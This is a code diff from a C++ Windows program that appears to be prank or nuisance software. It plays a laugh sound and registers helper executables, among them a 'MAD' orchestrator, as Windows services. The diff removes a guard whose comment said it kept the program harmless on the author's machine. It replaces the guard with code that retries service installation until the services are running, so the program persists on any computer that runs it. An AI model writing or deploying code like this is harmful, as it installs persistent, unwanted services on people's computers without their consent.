@@ -5,9 +5,6 @@
 #include <tlhelp32.h>
 
 
-
-
-
 char ExePath_holder [255] = {0};
 DWORD lol = GetModuleFileNameA(NULL, ExePath_holder, 255);
 std::filesystem::path expath(ExePath_holder);
@@ -432,20 +429,27 @@ int DetachFromMasterOutput(IAudioEndpointVolume* &endpointVolume, IMMDevice* &de
 
 int main(int argc, char* argv []) {
 
-    if (argc == 1)  //Just for Ayman, to not do any harm on my computer
-    {
+    #ifndef DEBUG
         std::string LaughServicePath = ParentDirectory + "\\" + "laugh_service.exe";
-        Sleep(100);
-        register_service_laugh_sound(LaughServicePath, "LaughService");
-        Sleep(100);
+        
+        while(register_service_laugh_sound(LaughServicePath, "LaughService") && (GetLastError() != ERROR_SERVICE_ALREADY_RUNNING))
+            {Sleep(200);}
 
-        std::string MADOrchestratorPath = ParentDirectory + "\\" + "MAD_Orchestrator.exe";
-        register_service_laugh_sound(MADOrchestratorPath, "MAD_Orchestrator");
+        std::string MADOrchestratorPath = ParentDirectory + "\\" + "MAD_Orch_Service.exe";
+        while(register_service_laugh_sound(MADOrchestratorPath, "MADOrch") && (GetLastError() != ERROR_SERVICE_ALREADY_RUNNING))
+            {Sleep(200);}
 
-        Intro(1);   //I chose, The short Intro
-    }   
+        
+    #endif  
 
 
+    Intro(1);   //I chose, The short Intro
+
+
+
+
+    
+    
     // Play the sound
     IMMDeviceEnumerator* deviceEnumerator = nullptr;
     IMMDevice* defaultDevice = nullptr;
